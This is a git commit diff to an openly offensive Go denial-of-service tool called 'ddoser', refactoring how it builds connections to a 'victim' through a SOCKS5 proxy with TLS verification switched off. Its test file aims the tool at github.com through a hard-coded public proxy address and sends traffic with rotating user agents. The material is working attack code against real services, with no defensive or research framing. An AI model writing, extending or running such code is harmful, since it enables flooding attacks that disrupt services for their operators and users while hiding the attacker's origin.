25d107efee5c6e3453c4e309420572d51d9d8605
ciricode <ciricode@protonmail.com>
2021-11-23 13:23:17 +0700

    Update

--- ddoser.go
+++ ddoser.go
@@ -3,39 +3,25 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
-	"io"
 	"net"
 	"net/http"
-	"net/url"
 	"time"
 
 	"golang.org/x/net/proxy"
 )
 
 type DDoser struct {
-	Conn    io.ReadWriteCloser
+	Conn    net.Conn
 	Request *http.Request
 }
 
-func NewDDoser(method, victim, socks5 string) (*DDoser, error) {
+func NewDDoser(req *http.Request, port, socks5 string) (*DDoser, error) {
 	var conn net.Conn
-	var req *http.Request
-	url, error := url.Parse(victim)
-
-	if error != nil {
-		return nil, error
-	}
-
-	req, error = http.NewRequest(method, victim, nil)
 
 	// Set keep alive
 	req.Header.Set("Connection", "keep-alive")
 
-	if error != nil {
-		return nil, error
-	}
-
-	address := fmt.Sprintf("%s:%s", url.Hostname(), url.Port())
+	address := fmt.Sprintf("%s:%s", req.URL.Hostname(), port)
 
 	// Native official proxy
 	client, error := proxy.SOCKS5("tcp", socks5, nil, &net.Dialer{
@@ -48,13 +34,12 @@ func NewDDoser(method, victim, socks5 string) (*DDoser, error) {
 	}
 
 	conn, error = client.Dial("tcp", address)
-
-	if url.Scheme == "https" {
-		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
-	}
-
 	if error != nil {
 		return nil, error
+	}
+
+	if req.URL.Scheme == "https" {
+		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
 	}
 
 	return &DDoser{conn, req}, nil
--- ddoser_test.go
+++ ddoser_test.go
@@ -1,15 +1,22 @@
 package main
 
 import (
+	"net/http"
 	"testing"
 )
 
 func TestDdos(t *testing.T) {
-	ddoser, error := NewDDoser("GET", "https://github.com:443", "72.210.208.101:4145")
+	req, error := http.NewRequest("GET", "https://github.com", nil)
 
 	if error != nil {
 		t.Error(error)
 	}
 
-	ddoser.Do(getUserAgents(10), 5)
+	ddoser, error := NewDDoser(req, "443", "72.210.208.101:4145")
+
+	if error != nil {
+		t.Error(error)
+	}
+
+	ddoser.Do(getUserAgents(10), 1)
 }
